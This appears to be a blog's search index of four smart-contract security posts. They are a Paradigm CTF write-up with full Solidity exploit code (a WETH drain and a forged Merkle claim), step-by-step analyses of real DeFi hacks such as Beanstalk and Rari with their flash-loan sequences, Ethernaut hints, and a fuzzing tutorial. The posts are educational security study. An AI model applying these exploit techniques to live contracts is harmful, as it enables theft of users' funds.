[ { "title": "My Paradigm CTF 2022 write-ups", "url": "/posts/my-paradigm-ctf-2022-write-up/", "categories": "ctf-write-ups", "tags": "solidity, EVM, security, smart contracts, ctf", "date": "2022-08-28 10:00:00 +0500", "snippet": "Paradigm CTF ?Paradigm hosted a CTF this year named Paradigm CTF 2022. It is an online competition organized for blockchain devs, smart contract devs &amp; hackers. It was also conducted last year in 2021. This year there were total of 23 challenges &amp; this time around multiple different platforms were a part of this CTF. Including EVM-based, Non-EVM i.e Cairo &amp; solana. There were also multiple difficulty level challenges &amp; some follow-up challneges which depended on solving some other challenges.My JourneyI along with my team managed to take down several challaenges that I will explain here. I focused more on the EVM based challenges as I was more familair with solidity &amp; completely ignored non-evm challenges. But, It was brought to my attention that few challenges were sanity checks meaning they were very very basic challenges we could have crunched in more challenge points for solving them. Sadly by that time the CTF was over! Challenge 1: RandomThis was a very simple challenge in which we had to call the the functio solve with a random value number generated by the contract. By simply inspecting the contract we could deduce the number was 4. It helped getting more comfortable with the challenge submission process.pragma solidity 0.8.15;contract Random { bool public solved = false; function _getRandomNumber() internal pure returns (uint256) { // chosen by fair dice roll. return 4; // guaranteed to be random. } function solve(uint256 guess) public { require(guess == _getRandomNumber()); solved = true; }}Challenge 2: Rescue I accidentally sent some WETH to a contract, can you help me?Rescue was more of a financial exploit rather than a reverse engineering or logical-error challenge. Some WETH has been sent to the contract &amp; we somehow need to recover them. The challnge is solved if the WETH balanceOf contract is 0.In this challenge, we were provided with the following contracts. MasterChefHelper.sol which handles the operations such as adding liquidity &amp; swapping tokens. UniswapV2Like.sol which has the helper interface to interact with the DEX.There are many different ways to solve this challnege here is the strategy we used. Create a new token XYZ. Buy 10 ether worth of Sushi &amp; send it to MasterChefHelper. Create a new pair of XYZ &amp; Sushi. This is needed as the swapTokenForPoolToken function requires two token addresses. Then we call the function swapTokenForPoolToken it internally calls add_liquidity which takes the tokens i.e SUSHI &amp; XYZ in MasterChefHelper &amp; adds the liquidity. It also mints the liquidity tokens which we can burn to get the assets for ourselves. The main objective of removing WETH from the contract is acheived. contract Exploit { WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); UniswapV2RouterLike public constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F); Token public xyz; address sushi = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2; MasterChefHelper mcHelper; constructor(address _helper) { xyz = new Token(); mcHelper = MasterChefHelper(_helper); ERC20Like(sushi).approve(address(router), type(uint256).max); ERC20Like(address(weth)).approve(address(router), type(uint256).max); ERC20Like(address(xyz)).approve(address(router), type(uint256).max); } function getSushi(uint256 amountIn) external { address[] memory path = new address[](2); path[0] = address(weth); path[1] = sushi; //sushi router.swapExactTokensForTokens( amountIn, 0, path, address(this), block.timestamp ); } function createPairWithSushi() external { router.addLiquidity( address(xyz), address(weth), 10000 ether, 1 ether, 99 ether, 0.5 ether, address(this), block.timestamp ); router.addLiquidity( address(xyz), sushi, 10000 ether, 1 ether, 99 ether, 0.5 ether, address(this), block.timestamp ); // the pair of the pool that got created } function getWeth() external payable { weth.deposit{value: msg.value}(); // Now the contract has weth } function exploit(address _addr) external { ERC20Like(sushi).transfer( _addr, ERC20Like(sushi).balanceOf(address(this)) ); mcHelper.swapTokenForPoolToken(12, address(xyz), 0.0000001 ether, 0); } receive() external payable {}} Challenge 3: Merkledrop Were you whitelisted?In this challenge, we are presented with the following contracts &amp; files. MerkleDistributor.sol which has a claim function that is responsible for claiming of tokens for addresses that are whitelisted. MerkleProof.sol that handles the logic for verifying proofs. tree.json file that contains proofs for indexes. Taking a quick look at Setup.sol file gave us the following conditions to fulfill in order to complete the challenge.function isSolved() public view returns (bool) { bool condition1 = token.balanceOf(address(merkleDistributor)) == 0; bool condition2 = false; for (uint256 i = 0; i &lt; 64; ++i) { if (!merkleDistributor.isClaimed(i)) { condition2 = true; break; } } return condition1 &amp;&amp; condition2;} All of the tokens must be claimed 75,000 * 1e18. Atleast one of the leaf must not be claimed! which seems impossible to do. But is it ?Okay, A few basics on this one as I spent half my day figuring out was exactly wrong! Merkle Tree is a data structure that has at most 2 nodes for each parent. Both of the nodes are hashed together to form the hash of the parent. This continues untill only one root is left called the merkleRoot. This is mostly used for airdropping token to users that are whitelisted. Each whitelisted entry would be a node with hash with amcount &amp; it’s corresponding amount for claiming. The proof for every user is generated &amp; provided while claiming the tokens through the contract. This is an efficient technique as users pay gas for claiming &amp; the underlying project does not manually have to airdrop to millions of users in multiple batch transactions! So basically, the tree.json file that has been provided to us is collection of users addresses &amp; their proof so it can be verified in the merkleRoot. okay, how do we solve it ?In MerkleDistributor.sol contract we can see the claim function that is very identical to normal merkleDistributor contracts. But if we look close enough we find this nifty detail.function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external { // ---- snip ---- // Verify the merkle proof. bytes32 node = keccak256(abi.encodePacked(index, account, amount)); // ---- snip ---- }We notice two things, The function signature has the amount of type uint96 instead of uint256. The node which is of type bytes32 which is kecack256 hash of index, account &amp; amount.We can try to list all abi.encodePacked(...) of the claiming accounts &amp; re-construct the node for every entry this gives is the following format# index(32-bytes)-account(address)-amount(uint96)# The max value for uint96 = 0xffffffffffffffffffffffff# Since any amount will be less than (2 ** 96 - 1) the method will padd extra zeros to fill in space for uint96 as below (The number I use is 120e18):0x0000000000000000000000000000000000000000000000000000000000000001-0x374aeA8F8Cd3aDD133EF378A9dD6FC74878E8975-000000-410d586a20a4c00000We have extra zeros, so what you may ask ? You may have looked at the tree.json file. There is one entry in the proofs array which has exactly the same pattern. That is index 37.0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207bWhat can we assume from this ? A proof entry might be a valid hash in the merkleRoot ? Let’s analyze. The last 12-bytes i.e 00000f40f0c122ae08d2207b is 72033.437049132565012603 tokens. Less than 75,000. That’s fishy! Also if we deduct the amount from 75,000 it is 2966.562950867.If our theory is correct there should be some combination of amounts that we can use that could be added up or simply be 2699.56. I took first 10 entries &amp; calculated the amount in decimals.jq -r '.claims[].amount' tree.json | while read -r line; do cast --to-dec \"$line\"; done | while read -r line; do cast --from-wei \"$line\"; doneAND WE WERE RIGHT !!176.4264264264306382001205.2521969809554351261012.212015703759209792468.0136806846390529821438.6807359678427987741096.432701108382010527681.817012393491087328993.6598598430978335992966.562950867434987397 // The madness at index 9!2124.350787947865515262# --- snip ---Adding up both of the token amounts equates to eaxctly 75,000 tokens! In order to claim this we nee more information. We have the account for which we can claim, the amount that. For index, it is going to be the hash of index 37. And the proofs are going to be the proof of 37 from 1-5 index.Index 95977926008167990775258181520762344592149243674153847852637091833889008632898Account0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72AAmount 72033437049132565012603proofs0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f3868130x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5After claiming this, we can claim the index 8 which will satisfy our conditions.contract ExploitScript is Script { Setup setup; MerkleDistributor merkle; function setUp() public {} function run() public { setup = Setup(ADDRESS_HERE); merkle = MerkleDistributor(address(setup.merkleDistributor())); bytes32[] memory proof = new bytes32[](5); proof[0] = 0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d; proof[1] = 0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde; proof[2] = 0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813; proof[3] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c; proof[4] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5; merkle.claim( 95977926008167990775258181520762344592149243674153847852637091833889008632898, 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A, 72033437049132565012603, proof ); bytes32[] memory proof2 = new bytes32[](6); proof2[0] = 0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00; proof2[1] = 0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3; proof2[2] = 0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2; proof2[3] = 0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a; proof2[4] = 0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c; proof2[5] = 0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5; merkle.claim( 8, 0x249934e4C5b838F920883a9f3ceC255C0aB3f827, 2966562950867434987397, proof2 ); }}Solved after the CTF!There were few other challneges that I solved sadly after CTF ended. Will share a write-up on those too! Source code Trapdooor Trapdoooor VanityWrap up!This was the first ever CTF I participated in. It was a great experience &amp; frustrating at the same time as I spent a a good amount of time simply looking the code for hours! Nevertheless, it was fun &amp; we learned alot about security by breaking them." }, { "title": "Major DeFi hack analysis & POCs", "url": "/posts/defi-hack-analysis-poc/", "categories": "hack-analysis", "tags": "exploit, defi-securiry, poc", "date": "2022-07-16 10:00:00 +0500", "snippet": "IntroductionDefi hacks have become a major target for hackers to extract the value from the protocol with very little effort &amp; cost. In the web3 space it is very economically feasiblt to attack larger platforms &amp; disappear into the abyss of mixers.Here I discuss some the major defi hacks that took place in the past. We will analyze them to figure out what exactly went wrong. What strategies attackers normally take after exploiting a protocol.In this blog post, I have compiled 10 defi hack analysis &amp; developed theri POCs for the purpose of understnding the mistakes that protocols made &amp; learn from it to avoid this the future. While developing the POCs I cam to realize that many of the exploits included flashloan + re-entrancy combination along with some incorrectly handled access control mechanism. I have also seen a few recent hacks that took place but haven’t created their POCs as they are pretty much the same to the exploits that I have written in this post. Going through the exploit repository you should be able to re-create those exploits as majority of them follows the same pattern.I would aslo like to cateforize some hacks: Compromised or leaked private keys {Keep the damn thing safe!} Incorrect implementation of Access control mechanism in smart contracts which leads to ownership takeover. Incorrect handling of checks-effect-pattern which causes Re-entrancy attacks. Lack of signature verification, this applies to contracts that store the signature hash &amp; cross-chain bridges. Unsafe usage of Delegate calls &amp; Proxy mechanism. Oracle Manipulation attacks.Here is the repository for exploit re-creation. You can follow the insturctions for running the exploits on forked enviroment.Defi Exploit POCsThe infamous DAOHack - The Classic Re-entrancy (2016)This was a classic re-entrancy attack which led to the fork of Ethereum (ETH) &amp; Ethereum-classic (ETC) chain split. There was a debate on whether to fork the chain or not back in the day. This was I beleive the first attack in which the attacker managed to withdraw 3,800,000 (3.8 Million) Ether!The core of the attak was: The contract sent Eth to the person buying &amp; deducted the balance after the transfer of Eth. When the Eth is transfered to a function, it invokes the fallback function of the contract. Here the attcker used the opportunity to re-renter the function after depositing the amount. The attcker repeatedly called the function in fallback &amp; withdrew 3.8 Million Ether. Therefore, Use the check-effect-pattern to migitage risks as such!See the POC here.Beanstalk Finanace Hack (April, 2022)Beanstalk protocol got hacked for around $74M through exploiting the governance mechanism &amp; stealing all the BEANS &amp; Curve LP tokens stored in the Beanstalk protocol. It is a bit complex hack, lets break it down step by step. Hack Transaction Hackers Address Hacker Exploit Contract Beanstalk Proposal Transaction The attacker starts by taking a flashloan of $1 Billion from AAVE v2 containing the following assets. 350,000,000 DAI 500,000,000 USDC 150,000,000 USDT The attacker takes yet another Flashloan from uniswap v2 for 32,100,950 BEAN &amp; Sushiswap for 11,643,065 LUSD. Then the attacker deposits DAI, USDC &amp; USDT to Curves 3Pool (DAI/USDC/USDT) to get 979,691,328 3Crv tokens. Exchange 15,000,000 CRV tokens to 15,251,318 LUSD on BEANLUSD-f pool. Add single asset liquidity 964,691,328 CRV to get 795,425,740 BEAN3CRV-f. The attacker deposits 32,100,950 BEAN &amp; 26,894,383 LUSD to get 58,924,887 BEANLUSD-f The user then deposits BEANLUSD-f &amp; BEAN3CRV-f to beanstalk contract to get enough voting power. The attacker calls Diamond.vote(18) At this point user has control over 66% of voting power. The proposal gets executed by calling the Diamond.emergencyCommit(18) function on beanstalk protocol which send back the following tokens back to the exploit contract. 36,084,584 BEAN 0.540716100968756904 UNI-V2 ETH/BEAN. 874,663,982 BEAN3CRV-f. 60,562,844 BEANLUSD-f. 100 BEAN minted to the exploit contract. Removes 874,663,982 CRV single liquidity to get 1,007,734,729 CRV tokens. Removes 60,562,844 BEANLUSD-f single liquidity to get 28,149,504 LUSD. Returns flashloan of 11,678,100 LUSD to Sushiswap. Returns flashloan of 32,197,543 BEAN to Uniswap V2. Exchanges 16,471,404 LUSD to get 16,184,690 CRV on LUSDCRV-f. Removes liquidity from 511,959,710 3CRV Pool to get 522,487,380 USDC, 358,371,797 DAI, 156,732,232 USDT. Returns flashloan on aave for 350,315,000 DAI, 500,450,000 USDC &amp; 150,135,000 USDT. Removes liquidity on 0.540716100968756904 Uniswap V2 to get 10,883 Eth &amp; 32,511,085 BEAN. Donated 250,000 USDC to Ukraine Donation Wallet. Swap 15,443,059 DAI to 15,441,256 USDC on Uniswap V3. Swap 37,228,637 USDC for 11,822 Eth on Uniswap V3. Swap 6,597,232 USDT for 2,124 Eth on Uniswap V3. Leaving the attacker with over 24k Eth ~ $72M in profit.THE EXIT STRATEGYThe hacker used tornado cash &amp; split the ~24k Eth into chunks of 1, 10 &amp; 100 Eth to disappear in thin air. One thing to note is that this hack was a result of a bad governance design and not the economic design.See the POC hereRari-Capital Fuse Hack (April, 2022)Rari capital got hacked for around $79M through a classic re-entrancy attack. Rari is a fork of compound finance which had this bug fixed earlier. It is not the first time Rari has been a victim of a hack.Pre-requisite Rari is a fork of compound finance &amp; compound had a known issue of re-entrancy attack whenever CTokens were borrowed through borrow() function. This was patched by the Rari team by introducing a pool-wide re-entrancy guard on CTokens. There also exists a component called “comptroller” which is responsible for functions such as providing &amp; withdrawing collateral by calling enterMarkets() &amp; exitMarket respectively. The comptroller contract did not have re-entrancy checks in place. The attacker exploited through the exitMarket() function which makes the deposited asset no longer a collateral meaning it can be withdrawn at any time.The ExploitThe attacker created 2 contracts. For Exploiting Rari Fuse Pools For Receiving Profits after exploitsThere were 7 pools that were affected due to this exploit (8，18，27，127，144，146，156) Attacker took flashloan of 50,000 WETH &amp; 80,000 WSTETH from Balancer vault Attacker deposited 80,000 WSTETH collateral into fWSTETH-146 pool. After depositing, the attacker borrowed 2397 ETH from fWSTETH-146 pool without updating the borrowers record. The pool triggers the fallback function of the exploiter contract while sending ether to the exploit contract where the attacker makes a re-entrant call to exitMarket() &amp; withdraws his collateral of 80,000 WSTETH. The attacker receives 2397 ETH for free &amp; transfers it to another contract for later claiming. The attacker repeats steps 1–4 until all borrowed amount is collected. The attacker applies the same strategy on 7 different pools &amp; runs away with ~$79M of profit.See the Rari-Capital POC hereWintermute Multisig Hack (June, 2022)This is attack that took place on OPTIMISM network. This POC continously creates proxy contracts to create wintermute multi-sig that had not been deployed to optimism network &amp; only existed on ethereum. The attacker took advantage of this as the OPTIMISM team gad already sent around 20M OP tokens to this contract which hacker took custody of.The attacker recursively generated addresses through the gnosis multisig until the address was generated allowing him to deploy contract at that particular address &amp; retrieved the tokens.See the Wintermute POC here.XCarnival NFT Lending Protocol Hack (June, 2022)A hack that took place on Ethereum Block 15028861, where the hacker walked away with around $3.8M in ETH exploiting the XCarnival NFT Lending protocol. The attacker uses the pledgeAndBorrow function in the XNFT contract to use NFTs as collateral and borrow xToken. Then, a call is made using the withdrawNFT function in order to extract the pledged NFT. This function first checks to see if the order has been closed. If it hasn’t, it checks to see if the NFT hasn’t been withdrawn and the loan amount is 0. If none of these conditions are met, it then determines that the NFT has not been withdrawn and the order is still active (no debt). NFTs that are used for collateral can be withdrawn. The attack itself starts when the attacker uses the order to directly call the borrow function in the xToken contract. Since the contract assumes the NFT has been already returned allow the attcker to withdraw more funds. The essence of this vulnerability is that there is no check while borrowing to see whether the NFT in the order has been withdrawn, allowing an attacker to borrow without repayment after removing the NFT for their own benefit.See the XCarnival POC here.Pickle Finance Hack (Nov, 2020)On 21st November 2021, Pickle finance was hacked, where an attacker was able to drain $19M DAI from the pDai jar. The attack exploited multiple inconsistencies &amp; flaws in the logic of the pickle jar smart contract.Pre-Requisite: Pickle Jar contract had a function swapExactJarForJar() which was meant to be generalized to bring more flexibility to the protocol. However, the attack could have been prevented if the function checked for whitelisted ones. The attacker’s jars contain minimalist functions to function as a jar and since the user controls Jars most of the checks can be easily bypassed.The ExploitThe user-created two Jar contracts Attackers Address Attack TransactionThe attacker deploys two new fake Jars. First Jar Second Jar The attacker calls strategyCmpdDaiV2.getSuppliedUnleveraged() which returns the amount of DAI available i.e 19728769153362174946836922 ~ 19M.728 DAI. The attacker calls swapExactJarForJar the first time, supplying fake Jar addresses created earlier which withdraws deleveraged invested DAI from the compound back to pDAI Jar. The Attacker calls earn() function 3 three times on pDAI (Pickling Dai) minting cDAI to StrategyCmpdDaiV2 contract. The attacker deploys another two fake Jars &amp; a fake underlying. Third Jar Fourth Jar Fake Underlying contract Then the attacker calls swapExactJarForJar, this time passes in the third &amp; fourth Jar with crafted data that makes a function call to curve proxy in the context of the controller-v4. Since the attacker has crafted the Jar to work with the contract it bypasses checks to the point where arbitrary code is executed in the context of the controller-v4 contract. Then withdraw() is called to withdraw 950,818,864 cDAI to controller-v4. The withdrawn cDAI are deposited to the fake Jar through deposit() and all cDAI is transferred to the attacker. The attacker calls redeemUnderlying on the compound to convert all cDAI to DAI &amp; walks away with ~19M DAI.Here is the Pickle Finance Hack POCHarvest Finance Hack (October, 2020)Harvest finance got hacked for around $34M due to a flashloan attack which manipulated the price in the Curve pool to retrieve more USDT tokens than originally deposited USDT amount in fUSDT pool. This attack was also possible on other f-pools using the same set of steps described below. But the attacker chose not to continue. If the attack had continued, the attacker would have walked away with ~$400M worth of assets. The attacker deploys a contract &amp; pre-funds it with 10.69M USDT &amp; 11.435M USDC The attacker took flashloan of 50M USDT from the Uniswap v2 USDT-WETH pair. The attacker then swaps 11.425M USDC for 11.407M USDT. Now the contract has 60.66M USDT. A total of 60.66M USDT are then deposited to the fUSDT pool to get 71668595794204 fUSDT tokens. The attacker then swaps 11.437M USDT back for USDC. The attacker withdraws the deposited fUSDT to claim 61.1M USDT which is more than what was originally deposited i.e 60.6M USDT. Gaining profit of approximately 0.5M.The attacker repeatedly called steps 3-6 4 times to gain profit.See the Harvest Finance Hack hereInverse finance Hack (June 2022)Inver finance was hit by the attcker in mid June 2022, and is the classic example of oracle manipulation. The attackers managed to steal ~6M worth of tokens.I have omitted the detailed steps for the eploit which I belive are easily understood by taking look at the code. As hervest finance attack was similar to it.Check out the Inverse Hack POC hereHonorable MentionsThe infamous ‘Accidently killed it’ (July, 2017)A person was experimenting with the newly deployed wallet for parity. And this person accidently killed it be becomming the owner &amp; calling self-destruct on the contract. Whether it was intentional or a mistake remains a mystery!Though this was not exactly a hack but it qualified in my honorable mentions list.Here is the github issue.See the TheParityKill POC here" }, { "title": "Solutions to Ethernaut Challenges", "url": "/posts/ethernaut-writeups/", "categories": "challenge-write-ups", "tags": "solidity, EVM, security, smart contracts, challenge", "date": "2022-05-23 10:00:00 +0500", "snippet": "IntroductionEthernaut is a wonderful website based game developed by Openzeppelin and played in Ethereum virtual machine. Each level is a smart contract that needs to be ‘hacked’. This game provides opportunity to learn more about the never ending knowledge of the EVM based smart contracts &amp; use this knowledge to secure or rescue actual contracts in live enviroment i.e Ethereum mainnet.In this blog post, I’ll share hints &amp; descriptions of the challenges for which I have posted the solutions on github that you can find here.Pre-requisiteI have solved these challenges in foundry, a smart contract development framework. You can use also hardhat. Before you start, you will need basic understanding of Solidity language Basics of EVM execution flow Familiarity with web3.js or ethers.jsChallenge Spoilers!1. FallbackDescriptionIn this challenge the user is provided with a contract called Fallback.sol. The goal of this challenge is to become the onwer of the contract &amp; drain all the funds (Eth).HintCall the contribute() function by sending it some eth &amp; then call withdraw() method to drain all funds!This challenge requires user to be familiar with the following concepts. Fallback functions &amp; when they are triggered. Ownable &amp; access control functionality.Check out solution &amp; walkthrough here!2. FalloutDescriptionIn this challenge the user is provided with a contract called Fallout. The goal of this challenge is to become the onwer of the contract &amp; drain all the funds (Eth).HintThis challenge requires user to be familiar with the following concepts. Fallback functions &amp; when they are triggered. Ownable &amp; access control functionality. Attention to detail!Check out solution &amp; walkthrough here!3. Coin FlipDescriptionIn this challenge the user is provided with a contract called Coinflip.sol. The goal of this challenge is win 10 times consecutively by calling the flip() function of the contract.HintThis challenge requires user to be familiar with the following concepts. Pseudo-Randomness in computer systems.Check out solution &amp; walkthrough here!4. TelephoneDescriptionIn this challenge the user is provided with a contract called Telephone.sol. The goal of this challenge claim the ownership of the contract.HintThis challenge requires user to be familiar with the following concepts. Difference between tx.origin &amp; msg.sender.Check out solution &amp; walkthrough here!5. TokenDescriptionIn this challenge the user is provided with a contract called Token.sol. The goal of this challenge is to hack the the token contract.Check out solution &amp; walkthrough here!6. TokenDescriptionIn this challenge the user is provided with a contract called Delegate.sol. The goal of this challenge claim the ownership of the contract.HintThis challenge requires user to be familiar with the following concepts. Solidity delegtecall function &amp; storage layout. Fallback functions.Check out solution &amp; walkthrough here!7. ForceDescriptionIn this challenge the user is provided with a contract called Force.sol. The goal of this challenge to send ether to the contract that has no ability to receive ether.HintThis challenge requires user to be familiar with the following concepts. Solidity selfdestruct() function from the docs!Check out solution &amp; walkthrough here!8. VaultDescriptionIn this challenge the user is provided with a contract called Vault.sol. The goal of this challenge to unlock the vault.HintThis challenge requires user to be familiar with the following concepts. Storage or slot packing technique while contract creation.Check out solution &amp; walkthrough here!9. KingDescriptionIn this challenge the user is provided with a contract called King.sol. The goal of this challenge to become the king in such a way that no one should be able to overpay &amp; become the king.HintThis challenge requires user to be familiar with the following concepts. Solidity fallback() funtion.Check out solution &amp; walkthrough here!10. ReentranceDescriptionIn this challenge the user is provided with a contract called Reentrance.sol. The goal of this challenge to drain the contract.HintThis challenge requires user to be familiar with the following concepts. Checks-effects-interaction pattern Re-entrancy attacks.Check out solution &amp; walkthrough here!11. ElevatorDescriptionIn this challenge the user is provided with a contract called Elevator.sol. The goal of this challenge is to set the variable top to true.Check out solution &amp; walkthrough here!12. PrivacyDescriptionIn this challenge the user is provided with a contract called Privacy.sol. The goal of this challenge is to set the variable locked to false.HintThis challenge requires user to be familiar with the following concepts. Storage or slot packing technique while contract creation.Check out solution &amp; walkthrough here!13. GateKeeperOneDescriptionIn this challenge the user is provided with a contract called GatekeeperOne.sol. The goal of this challenge is to set the entrant variable to tx.origin.HintThis challenge requires user to be familiar with the following concepts. Difference between tx.origin &amp; msg.sender. How gasleft() is used in solidity. How solidity type casting works.Check out solution &amp; walkthrough here!14. GateKeeperTwoDescriptionIn this challenge the user is provided with a contract called GatekeeperTwo.sol. The goal of this challenge is to set the entrant variable to tx.origin.HintThis challenge requires user to be familiar with the following concepts. Difference between tx.origin &amp; msg.sender. Properties of XOR operations. Contract creation mechanism &amp; extcodesize() function.Check out solution &amp; walkthrough here!15. NaughtDescriptionIn this challenge the user is provided with a contract called Naught.sol. The goal of this challenge is to transfer the tokens before the timelock period.HintThis challenge requires user to be familiar with the following concepts. Basic working of ERC20 tokens. Understanding of approve() &amp; transferFrom() functions.Check out solution &amp; walkthrough here!16. preservationDescriptionIn this challenge the user is provided with a contract called Preservation.sol. The goal of this challenge is to claim the ownership of the contract.HintThis challenge requires user to be familiar with the following concepts. How delegatecall &amp; storage layout works in solidity smart contract.Check out solution &amp; walkthrough here!17. RecoveryDescriptionIn this challenge the user is provided with a contract called Recovery.sol. The goal of this challenge is to claim the ownership of the contract.HintThis challenge requires user to be familiar with the following concepts. How a smart contract address is predicted or computed with create() &amp; create2().Check out solution &amp; walkthrough here!18. Magic NumberDescriptionIn this challenge the user is provided with a contract called Magicnumber.sol. The goal of this challenge is deploy a contract that returns ‘42’ but only 10 opcodes are allowed no more!.HintThis challenge requires user to be familiar with the following concepts. Compiler bytecode &amp; opcodes. For reference visit, https://evm.codes Create2 &amp; Create opcodes for contract creating. Solidity assembly.Check out solution &amp; walkthrough here!19. Alien CodexDescriptionIn this challenge the user is provided with a contract called AlienCodex.sol. The goal of this challenge is to claim the ownership of the contract.HintThis challenge requires user to be familiar with the following concepts. Solidity Integer overflow/underflow. Solidity storage layout.Check out solution &amp; walkthrough here!20. DenialDescriptionIn this challenge the user is provided with a contract called Denial.sol. The goal of this challenge is to place a mechnism such that the owner cannot withdraw ether from contract even though it has it.HintThis challenge requires user to be familiar with the following concepts. Solidity fallback() funtion.Check out solution &amp; walkthrough here!21.DescriptionIn this challenge the user is provided with a contract called Shop.sol. The goal of this challenge is to set the variable price to be less than 100.Check out solution &amp; walkthrough here!22. DexDescriptionIn this challenge the user is provided with a contract called Dex.sol. The goal of this challenge is to drain token0.Check out solution &amp; walkthrough here!23. DexTwoDescriptionIn this challenge the user is provided with a contract called DexTwo.sol. The goal of this challenge is to drain token0 &amp; token1 from the dex.Check out solution &amp; walkthrough here!ConslusionThat’s all folks. I hope this write-up helped you. See you next time." }, { "title": "Property-based testing & fuzzing smart contracts", "url": "/posts/fuzzing-property-testing/", "categories": "smart-contract", "tags": "evm, solidity, security, ethereum, smart-contract, testing", "date": "2022-04-19 10:00:00 +0500", "snippet": "IntroductionProperty-based testing is described as a testing philosophy which targets all types of testing including unit, acceptance &amp; integration testing. It was mainly standardized and properly introduced by QuickCheck, a Haskel based framework.This testing methodology is now widely adapted &amp; is being used by developers to bulletproof their code for greater reliability &amp; resilience. That means ready for production, fearlessly!What exactly is Property-based testing ?It can be defined as “An extracted statement or property of the code, program or a function to be tested in a way that the property or the statement always holds true”. In this type of testing, multiple different inputs are tested against a piece of code or a function in order to invalidate, fail or break the code flow. This is especially useful in identifying the missed edge-cases in the system.Writing unit tests, covers a single aspect of code (i.e certain functionality works) whereas property-based testing focuses more on the outputs based on many different inputs provided to the code that needs to be tested. This by no means undermines the importance of writing unit tests.Properties identified from system analysis are tested to check if they hold. one of the method for testing or falsifying the properties is called fuzzing. Where the fuzzer uses random seeds to prepare for initial calldata for breaking the properties. If the fuzzer has not found the calldata for breaking the property we can checkmar the contract safe enough but can’t assure compelete security guarantees since the fuzzer runs in somewhat radomized manner which might completely miss the sequence for breaking the property.Brief Introduction of smart contractsSmart contracts are programs (aka, contracts) written in solidity language which are deployed on the ethereum blockchain or any EVM-based chains. Smart contracts contain a number of functions which can be called by users making a transaction (i.e calling a function on that contract) to the blockchain.These contracts compile down to bytecode (i.e machine readable format) &amp; are executed in the ethereum virtual machine (EVM). EVM executes as a stack machine which holds the rules for transitioning ethereum blockchain state from block to block. An example of a transaction can be the transfer of tokens from one address to another or transfer of the ownership of the contract to an address.Importance of smart contract TestingTesting the contract for its robustness &amp; reliability are key factors in making the contract secure &amp; bulletproof. One of the main reasons it is important is that these contracts will store or at the very least interact with the protocols that hold millions of dollars of money.Once the smart contract is deployed it becomes public over the network &amp; anyone can interact with it meaning opening doors to hackers &amp; malicious users. Untested &amp; unaudited code can lead to huge loss for the protocol &amp; for the users using it.Most developers actively participate in writing the unit tests carefully for a contract or a codebase containing multiple contracts to make sure the functionality or function works as expected. A common testing strategy is scenario testing where after testing individual functions, multiple scenarios are created &amp; tested with varying number of inputs. Though this provides guarantee against individual working components. But, is it enough ? As these cases are identified manually &amp; tested leaving chances for explored edge-cases.Property-based testing in smart contractsThe most important property of smart contract based blockchain systems is the financial application composability which we normally call as DeFi applications or protocols. More complex integration with these protocols blur or hide the edge cases &amp; bugs that result in failure, loss of funds or malfunctioning of the application.Applying property-based testing helps in locating &amp; identifying the edge cases &amp; faulty assumptions that have been missed out during the unit &amp; scenario based testing. Property-based testing is done on the smart contracts by identifying the properties &amp; asserting if the invariant for a specific piece of code holds.pragma solidity 0.8.10;import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";contract MyToken is ERC20 { constructor() ERC20(\"MyToken\", \"MTK\") { _mint(msg.sender, 1_000_000 * 1e18); }}Based on the code sample above we can deduce the following properties. We will assume the contract cannot mint other than deployment and the contract doesn’t hold the burn function. from &amp; to addresses cannot be the zero address while the transfer is made. If from address transfers the tokens the tokens should be deducted from his balance. The from address should have at least the number of tokens which are being sent. If to address receives the tokens the tokens should be added to his balance. The total supply of the token remains unchanged. Balances after the trade are properly adjusted.For property-based testing we have multiple options to go with. We can use a tool developed by trailOfBits called Echidna which is a smart contract property-based testing framework. Foundry developed by Paradigm heavily inspired by dapptools. We are using foundry in this case.pragma solidity 0.8.10;import \"ds-test/test.sol\";import \"../Contract.sol\";interface Vm { function prank(address) external; function assume(bool) external;}contract ContractTest is DSTest { Vm vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D); MyToken token; address sender = address(1); address recipient = address(2); function setUp() public { token = new MyToken(); } function test(uint256 amount) public { vm.assume(amount &lt;= 100e18); uint256 from_balance = token.balanceOf(sender); uint256 recipient_balance = token.balanceOf(recipient); vm.prank(sender); token.transfer(recipient, amount); assertEq(token.balanceOf(sender), from_balance - amount); assertEq(token.balanceOf(recipient), recipient_balance + amount); }}Each of these properties will need to be tested separately. But, for the sake of simplicity we will be only looking at the transfer case. After writing the test case the program will run the function multiple times with different inputs trying ranges of values &amp; likely to come up with the case you didn’t expect or assumed was correct. If the program passes the tests then we have more surety about a specific functionality to robust &amp; error free, in this case, the transfer function.As we can see the program ran multiple inputs &amp; the test we wrote passed without any error. This was a very basic example of property-based testing through foundry. I intend to create a separate tutorial on using both foundry &amp; echidna for smart contract fuzzing soon so 